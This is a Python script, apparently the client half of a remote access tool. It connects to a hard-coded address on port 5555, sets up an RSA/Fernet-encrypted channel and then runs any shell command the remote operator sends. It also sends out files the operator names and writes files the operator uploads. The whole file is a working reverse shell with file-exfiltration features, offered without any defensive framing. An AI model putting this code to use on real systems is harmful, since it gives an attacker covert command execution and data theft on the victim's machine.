from cryptography.fernet import Fernet
from termcolor import colored
import subprocess
import platform
import pyfiglet
import socket
import time
import sys
import rsa
import os

global client
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(("192.168.30.125", 5555))

public, private = rsa.newkeys(1024)
client.send(public.save_pkcs1("PEM"))
cipher = client.recv(4096)
key = rsa.decrypt(cipher, private)

def encrypt(data, key=key):
    f = Fernet(key)
    token = f.encrypt(data)
    return token

def decrypt(cipher, key=key):
    f = Fernet(key)
    raw = f.decrypt(cipher)
    return raw

print(colored(pyfiglet.figlet_format("Connection Successful!"), 'green'))
os_type = platform.system().lower()
client.send(encrypt(os_type.encode()))

try:
    while True:
        while True:
            data = decrypt(client.recv(4096)).decode()

            if data == 'exit':
                client.close()
                sys.exit()

            if data == 'stop':
                client.send(encrypt(b"\n\r"))
                break

            if data == 'cd'.strip():
                directory = os.getcwd()
                client.send(encrypt(directory.encode()))

            if data.lower().startswith('cd '):
                try:
                    change = data.split(" ",1)[1]
                    os.chdir(change)
                    pwd = os.getcwd()
                    client.send(encrypt(pwd.encode()))
                    continue

                except FileNotFoundError:
                    alert = "This is a file not found error"
                    client.send(encrypt(alert.encode()))
            if data.startswith("getfile"):
                try:
                    filepath = data.split()[1]
                    print(f"This is filepath \n{filepath}")
                    if os.path.exists(filepath):
                        print(f"File EXISTS")
                        with open(filepath, "rb") as f:
                            a = f.read(4096)
                            while a:
                                client.send(encrypt(a))
                                a = f.read(4096)
                            time.sleep(0.3)
                            client.send(encrypt(b"\n\r"))
                        print("[+] Successfully sent")
                        continue
                    else:
                        print("[!] ERROR file not found")
                        continue
                except Exception as e:
                    print(f"[!] Somthing unexpeted happened: Here is error \n{e}")
                    continue

            if data.startswith("sendfile"):
                try:
                    filename = data.split("\\")[-1]
                    with open(filename, "ab") as f:

                        file_data = decrypt(client.recv(4096))
                        while file_data != b"\n\r":
                            f.write(file_data)
                            file_data = decrypt(client.recv(4096))
                except Exception as e:
                    print(f"[!] Failed to send file: {e}")
                    continue   

            shell = subprocess.run(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
            client.send(encrypt(shell.stdout))
        client.send(encrypt(os_type.encode()))

except ConnectionAbortedError:
    print(colored("Connection aborted by user", 'red'))
    sys.exit()

except Exception as e:
    print(e)
    client.send(encrypt(str(e).encode()))
